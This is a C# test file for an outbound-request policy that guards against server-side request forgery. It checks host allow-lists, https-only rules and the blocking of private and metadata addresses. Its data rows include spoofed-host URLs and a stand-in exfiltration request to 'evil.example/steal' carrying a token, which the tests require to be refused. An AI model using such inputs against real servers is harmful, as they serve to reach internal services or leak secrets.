using System.Net;
using Sfe.Core.Connections;

namespace Sfe.Tests;

/// <summary>
/// Where the server's calls to providers may go (<see cref="OutboundPolicy"/>): only the provider's hosts, only
/// https, never this computer or its network for an address a person typed.
/// </summary>
[TestClass]
public sealed class OutboundPolicyTests
{
    private static readonly OutboundRule Fixed = new(["api.provider.example", "*.content.example"]);

    [TestMethod]
    [DataRow("https://api.provider.example/2/files", true)]
    [DataRow("https://API.Provider.Example/x", true)]
    [DataRow("https://a.content.example/x", true)]
    [DataRow("https://a.b.content.example/x", true)]
    [DataRow("https://content.example/x", false)]
    [DataRow("https://evilcontent.example/x", false)]
    [DataRow("https://api.provider.example.evil.example/x", false)]
    [DataRow("https://evil.example/?h=api.provider.example", false)]
    [DataRow("https://api.provider.example@evil.example/x", false)]
    [DataRow("http://api.provider.example/x", false)]
    [DataRow("ftp://api.provider.example/x", false)]
    [DataRow("https://127.0.0.1/x", false)]
    public void AFixedRuleAllowsItsHostsOverHttpsOnly(string address, bool allowed) =>
        Assert.AreEqual(allowed, Fixed.Allows(new Uri(address)), address);

    [TestMethod]
    public void ARuleWithoutHostsAllowsAnyHttpsHost()
    {
        var typed = new OutboundRule([]);
        Assert.IsTrue(typed.Allows(new Uri("https://dav.home.example/remote.php")));
        Assert.IsFalse(typed.Allows(new Uri("http://dav.home.example/remote.php")));
    }

    [TestMethod]
    [DataRow("8.8.8.8", true)]
    [DataRow("203.0.113.7", true)]
    [DataRow("172.15.0.1", true)]
    [DataRow("172.32.0.1", true)]
    [DataRow("100.63.0.1", true)]
    [DataRow("2001:4860:4860::8888", true)]
    [DataRow("127.0.0.1", false)]
    [DataRow("127.8.9.10", false)]
    [DataRow("0.0.0.0", false)]
    [DataRow("10.1.2.3", false)]
    [DataRow("172.16.0.1", false)]
    [DataRow("172.31.255.255", false)]
    [DataRow("192.168.1.10", false)]
    [DataRow("169.254.169.254", false)]
    [DataRow("100.64.0.1", false)]
    [DataRow("224.0.0.1", false)]
    [DataRow("255.255.255.255", false)]
    [DataRow("::1", false)]
    [DataRow("::", false)]
    [DataRow("fe80::1", false)]
    [DataRow("fd00::1", false)]
    [DataRow("::ffff:127.0.0.1", false)]
    [DataRow("::ffff:192.168.1.1", false)]
    [DataRow("::ffff:8.8.8.8", true)]
    public void TellsPublicAddressesFromThisComputerAndItsNetwork(string address, bool isPublic) =>
        Assert.AreEqual(isPublic, OutboundPolicy.IsPublic(IPAddress.Parse(address)), address);

    [TestMethod]
    public async Task ARequestOutsideTheRuleNeverLeaves()
    {
        var transport = new CountingTransport();
        using var client = new OutboundPolicy(() => transport).CreateClient(Fixed);

        using var allowed = await client.GetAsync("https://api.provider.example/ok");
        Assert.AreEqual(HttpStatusCode.OK, allowed.StatusCode);
        var refused = await Assert.ThrowsExactlyAsync<RemoteStorageException>(() =>
            client.GetAsync("https://evil.example/steal?token=SECRET-TOKEN")
        );

        Assert.AreEqual(RemoteErrorKind.Refused, refused.Kind);
        Assert.AreEqual(1, transport.Requests);
        // The message goes to logs and answers: the host only, nothing of the path or the query.
        StringAssert.Contains(refused.Message, "evil.example");
        Assert.IsFalse(refused.Message.Contains("SECRET-TOKEN"));
    }

    [TestMethod]
    public async Task ARedirectIsHandedBackNotFollowed()
    {
        // The real transport never follows one; a fake one answering 302 shows the client hands it to the caller.
        var transport = new CountingTransport { Redirect = "https://evil.example/" };
        using var client = new OutboundPolicy(() => transport).CreateClient(Fixed);

        using var answer = await client.GetAsync("https://api.provider.example/moved");

        Assert.AreEqual(HttpStatusCode.Found, answer.StatusCode);
        Assert.AreEqual(1, transport.Requests);
    }

    private sealed class CountingTransport : HttpMessageHandler
    {
        public int Requests { get; private set; }
        public string? Redirect { get; init; }

        protected override Task<HttpResponseMessage> SendAsync(
            HttpRequestMessage request,
            CancellationToken cancellationToken
        )
        {
            Requests++;
            var answer = new HttpResponseMessage(Redirect is null ? HttpStatusCode.OK : HttpStatusCode.Found);
            if (Redirect is not null)
                answer.Headers.Location = new Uri(Redirect);
            return Task.FromResult(answer);
        }
    }
}
